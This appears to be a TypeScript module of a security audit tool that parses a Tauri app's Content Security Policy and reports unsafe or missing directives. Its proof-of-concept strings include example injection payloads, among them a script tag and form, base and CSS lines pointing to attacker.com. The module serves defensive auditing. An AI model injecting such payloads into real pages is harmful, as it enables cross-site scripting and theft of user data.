import { readFileSync } from "fs";
import { join } from "path";
import type { Finding, TestModule, TestResult, RunOptions } from "../types";

const CSP_LOCATION = "src-tauri/tauri.conf.json:24 (app.security.csp)";

type DirectiveMap = ReadonlyMap<string, readonly string[]>;

function parseCsp(csp: string): DirectiveMap {
  const map = new Map<string, readonly string[]>();
  const directives = csp.split(";").map((d) => d.trim()).filter(Boolean);

  for (const directive of directives) {
    const parts = directive.split(/\s+/).filter(Boolean);
    if (parts.length === 0) continue;
    const name = parts[0].toLowerCase();
    const values = parts.slice(1);
    map.set(name, values);
  }

  return map;
}

function readCsp(projectRoot: string): string | null {
  const configPath = join(projectRoot, "src-tauri", "tauri.conf.json");

  try {
    const raw = readFileSync(configPath, "utf-8");
    const config: unknown = JSON.parse(raw);

    if (
      config !== null &&
      typeof config === "object" &&
      "app" in config &&
      config.app !== null &&
      typeof config.app === "object" &&
      "security" in config.app &&
      config.app.security !== null &&
      typeof config.app.security === "object" &&
      "csp" in config.app.security &&
      typeof config.app.security.csp === "string"
    ) {
      return config.app.security.csp;
    }

    return null;
  } catch {
    return null;
  }
}

function checkDangerousValues(directives: DirectiveMap): readonly Finding[] {
  const findings: Finding[] = [];

  const scriptSrc = directives.get("script-src") ?? [];
  const styleSrc = directives.get("style-src") ?? [];

  if (scriptSrc.includes("'unsafe-inline'")) {
    findings.push({
      id: "CSP-001",
      severity: "MEDIUM",
      category: "CSP Analysis",
      title: "CSP allows unsafe-inline in script-src",
      location: CSP_LOCATION,
      description:
        "'unsafe-inline' in script-src allows execution of inline <script> blocks and javascript: URIs, bypassing CSP's primary XSS protection.",
      proofOfConcept:
        "CSP directive: script-src contains 'unsafe-inline'\nAttacker can inject: <script>maliciousCode()</script>",
      impact:
        "Inline script execution is permitted, enabling reflected and stored XSS attacks to execute even with CSP enabled.",
      remediation:
        "Remove 'unsafe-inline' from script-src. Use nonces (e.g. 'nonce-{random}') or hashes for legitimate inline scripts.",
    });
  }

  if (scriptSrc.includes("'unsafe-eval'")) {
    findings.push({
      id: "CSP-002",
      severity: "MEDIUM",
      category: "CSP Analysis",
      title: "CSP allows unsafe-eval in script-src",
      location: CSP_LOCATION,
      description:
        "'unsafe-eval' in script-src permits dynamic code execution via eval(), Function(), setTimeout(string), and similar APIs.",
      proofOfConcept:
        "CSP directive: script-src contains 'unsafe-eval'\nAttacker can exploit: eval(userControlledInput)",
      impact:
        "Dynamic code evaluation is permitted, increasing attack surface for injection vulnerabilities that reach eval-like sinks.",
      remediation:
        "Remove 'unsafe-eval' from script-src. Refactor code to avoid eval() and dynamic script construction.",
    });
  }

  if (styleSrc.includes("'unsafe-inline'")) {
    findings.push({
      id: "CSP-003",
      severity: "LOW",
      category: "CSP Analysis",
      title: "CSP allows unsafe-inline in style-src",
      location: CSP_LOCATION,
      description:
        "'unsafe-inline' in style-src permits inline style attributes and <style> blocks, enabling CSS injection attacks.",
      proofOfConcept:
        "CSP directive: style-src contains 'unsafe-inline'\nAttacker can inject: <div style='background:url(//attacker.com)'>",
      impact:
        "CSS injection can be used for data exfiltration, UI redressing, and phishing by overriding page styles.",
      remediation:
        "Remove 'unsafe-inline' from style-src. Use nonces or hashes for legitimate inline styles, or move styles to external stylesheets.",
    });
  }

  return findings;
}

function checkMissingDirectives(directives: DirectiveMap): readonly Finding[] {
  const findings: Finding[] = [];

  if (!directives.has("frame-ancestors")) {
    findings.push({
      id: "CSP-004",
      severity: "MEDIUM",
      category: "CSP Analysis",
      title: "CSP missing frame-ancestors directive",
      location: CSP_LOCATION,
      description:
        "The frame-ancestors directive is absent. Without it, the application relies solely on the X-Frame-Options header for clickjacking protection.",
      proofOfConcept:
        "No frame-ancestors directive found in CSP.\nPoC: <iframe src='https://target-app'></iframe> (may load depending on X-Frame-Options)",
      impact:
        "Without frame-ancestors, clickjacking attacks may succeed if X-Frame-Options is not present or is misconfigured.",
      remediation:
        "Add \"frame-ancestors 'none'\" or \"frame-ancestors 'self'\" to the CSP to prevent the application from being embedded in frames.",
    });
  }

  if (!directives.has("form-action")) {
    findings.push({
      id: "CSP-005",
      severity: "LOW",
      category: "CSP Analysis",
      title: "CSP missing form-action directive",
      location: CSP_LOCATION,
      description:
        "The form-action directive is absent, meaning form submissions are not restricted to trusted origins.",
      proofOfConcept:
        "No form-action directive found in CSP.\nInjected form: <form action='https://attacker.com'>...</form>",
      impact:
        "Attackers who achieve HTML injection can redirect form submissions to arbitrary external endpoints, leaking user data.",
      remediation:
        "Add \"form-action 'self'\" to restrict form submissions to the same origin, or list specific allowed destinations.",
    });
  }

  if (!directives.has("base-uri")) {
    findings.push({
      id: "CSP-006",
      severity: "LOW",
      category: "CSP Analysis",
      title: "CSP missing base-uri directive",
      location: CSP_LOCATION,
      description:
        "The base-uri directive is absent, allowing injection of a <base> tag that redirects all relative URLs to an attacker-controlled domain.",
      proofOfConcept:
        "No base-uri directive found in CSP.\nInjected: <base href='https://attacker.com'> — all relative links now point to attacker",
      impact:
        "A base tag injection can silently redirect navigation, script loads, and link targets to an attacker-controlled origin.",
      remediation:
        "Add \"base-uri 'self'\" or \"base-uri 'none'\" to the CSP to prevent base tag injection.",
    });
  }

  return findings;
}

function checkWildcardDomains(directives: DirectiveMap): readonly Finding[] {
  const findings: Finding[] = [];
  const wildcardDirectives: string[] = [];

  for (const [name, values] of directives) {
    const hasWildcard = values.some(
      (v) => v === "*" || (v.startsWith("*.") && !v.includes("localhost"))
    );
    if (hasWildcard) {
      wildcardDirectives.push(name);
    }
  }

  if (wildcardDirectives.length > 0) {
    findings.push({
      id: "CSP-007",
      severity: "LOW",
      category: "CSP Analysis",
      title: `CSP uses wildcard domains in: ${wildcardDirectives.join(", ")}`,
      location: CSP_LOCATION,
      description: `Wildcard domain entries found in directive(s): ${wildcardDirectives.join(", ")}. Wildcards broaden the allowed origin set beyond what is necessary.`,
      proofOfConcept: `Wildcard found in: ${wildcardDirectives.join(", ")}\nAny subdomain matching the wildcard pattern can serve resources.`,
      impact:
        "Overly broad source allowlists increase the attack surface. A compromised subdomain matching a wildcard can serve malicious resources that the CSP will permit.",
      remediation:
        "Replace wildcard entries with explicit, enumerated origins. If wildcards are required, document the accepted risk and narrow them as much as possible.",
    });
  }

  return findings;
}

async function run(options: RunOptions): Promise<TestResult> {
  const start = Date.now();
  const findings: Finding[] = [];
  let passCount = 0;

  const cspString = readCsp(options.projectRoot);

  if (cspString === null || cspString.trim() === "") {
    findings.push({
      id: "CSP-000",
      severity: "CRITICAL",
      category: "CSP Analysis",
      title: "Content Security Policy is missing or empty",
      location: CSP_LOCATION,
      description:
        "No CSP string was found at app.security.csp in tauri.conf.json. The application has no content security policy.",
      proofOfConcept:
        "tauri.conf.json app.security.csp is absent or empty.\nAll resource loads and script executions are unrestricted.",
      impact:
        "Without a CSP, the application has no browser-enforced defence against XSS, data injection, or clickjacking attacks.",
      remediation:
        "Define a restrictive CSP in tauri.conf.json under app.security.csp. Start with a strict policy and loosen only as needed.",
    });

    return {
      category: "CSP Analysis",
      findings,
      passCount: 0,
      duration: Date.now() - start,
    };
  }

  const directives = parseCsp(cspString);

  // Dangerous values: pass +1 for each check that does NOT fire
  const dangerousFindings = checkDangerousValues(directives);
  findings.push(...dangerousFindings);

  const dangerousChecks = [
    "'unsafe-inline' in script-src",
    "'unsafe-eval' in script-src",
    "'unsafe-inline' in style-src",
  ] as const;
  passCount += dangerousChecks.length - dangerousFindings.length;

  // Missing directives: pass +1 for each required directive that IS present
  const requiredDirectives = ["frame-ancestors", "form-action", "base-uri"] as const;
  const missingFindings = checkMissingDirectives(directives);
  findings.push(...missingFindings);
  passCount += requiredDirectives.length - missingFindings.length;

  // Wildcard check: pass +1 if no wildcards found
  const wildcardFindings = checkWildcardDomains(directives);
  findings.push(...wildcardFindings);
  if (wildcardFindings.length === 0) {
    passCount += 1;
  }

  return {
    category: "CSP Analysis",
    findings,
    passCount,
    duration: Date.now() - start,
  };
}

export const cspAnalysis: TestModule = {
  name: "CSP Analysis",
  description:
    "Parses the Tauri Content Security Policy and checks for dangerous values, missing directives, and overly broad wildcard domains.",
  run,
};
